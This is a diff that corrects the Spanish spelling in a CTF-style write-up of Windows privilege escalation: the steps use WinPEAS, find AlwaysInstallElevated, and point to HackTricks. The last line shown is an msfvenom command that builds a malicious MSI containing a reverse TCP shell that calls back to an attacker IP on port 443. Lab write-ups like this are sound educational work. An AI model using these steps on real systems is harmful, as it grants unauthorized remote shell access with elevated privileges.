@@ -1,4 +1,4 @@
-## Privilege Escalation {-}
+## Escalada de privilegios {-}
 
 ### Rootear la maquina {-}
 
@@ -8,7 +8,7 @@ whoami /priv
 whoami /all
 ```
 
-Aqui no vemos nada de interressante.
+Aqui no vemos nada de interesante.
 
 ```bash
 cd c:\
@@ -19,9 +19,9 @@ cd PROGRA~2
 dir
 ```
 
-Investigamos un poco pero no vemos nada muy interressante. Decidimos lanzarle un WinPEAS
+Investigamos un poco pero no vemos nada muy interesante. Decidimos lanzarle un WinPEAS
 
-#### Analysis de vulnerabilidad Privesc con WINPEAS {-}
+#### Analisis de vulnerabilidad Privesc con WINPEAS {-}
 
 ```bash
 cd c:\Windows\Temp
@@ -50,9 +50,9 @@ Vemos algo interressante en Checking AlwaysInstallElevated
 knitr::include_graphics("images/love-hklm-hkcu.png")
 ```
 
-Podemos seguir los passos descripto en el link [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)
+Podemos seguir los pasos descritos en el link [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)
 
-1. crear un msi mallicioso con msfvenom
+1. crear un msi malicioso con msfvenom
 
     ```bash
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f msi -o reverse.msi
